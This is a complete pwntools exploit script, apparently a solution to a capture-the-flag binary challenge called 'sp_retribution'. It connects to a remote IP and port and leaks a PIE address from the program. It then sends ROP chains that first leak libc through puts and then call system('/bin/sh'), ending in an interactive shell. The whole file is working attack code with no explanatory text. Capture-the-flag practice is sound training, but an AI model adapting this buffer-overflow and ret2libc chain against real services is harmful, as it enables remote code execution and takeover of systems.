from pwn import *

r = remote("64.227.37.214" ,31658)
#r = process("./sp_retribution")
e = ELF("./sp_retribution")
libc = ELF("./glibc/libc.so.6")
r.sendlineafter('>> ','2')
r.sendafter('y = ',b'A'*8)
r.recvuntil(b'[0x576b96b95df201f9]\n\n[*] Insert new coordinates: x = [0x53e5854620fb399f], y = ')
r.recvuntil(b'\n[*] New coordinates: x = [0x53e5854620fb399f], y = AAAAAAAA')
pie_leak = u64(r.recv(6).strip().decode('latin-1').ljust(8,'\x00'))
pie_base = pie_leak - 3440
pop_rdi = pie_base + 0xd33
exploit = b'A' * 88 + p64(pop_rdi) + p64(pie_base + e.got.puts) + p64(pie_base + e.plt.puts) + p64(pie_base + e.sym.main)
r.sendlineafter('(y/n): ' ,exploit)
r.recvuntil(b' Coordinates have been reset!')
libc_leak = u64((r.recvuntil('\x7f')[-6::1]+b"\x00\x00").decode('latin-1'))
libc_base = libc_leak - libc.sym.puts
r.sendlineafter('>> ','2')
r.sendafter('y = ',b'A'*8)
exploit = b"A" * 88 + p64(pop_rdi) + p64(libc_base + next(libc.search(b"/bin/sh\x00"))) + p64(libc_base + libc.sym.system)
r.sendlineafter('(y/n): ' ,exploit)
r.interactive()
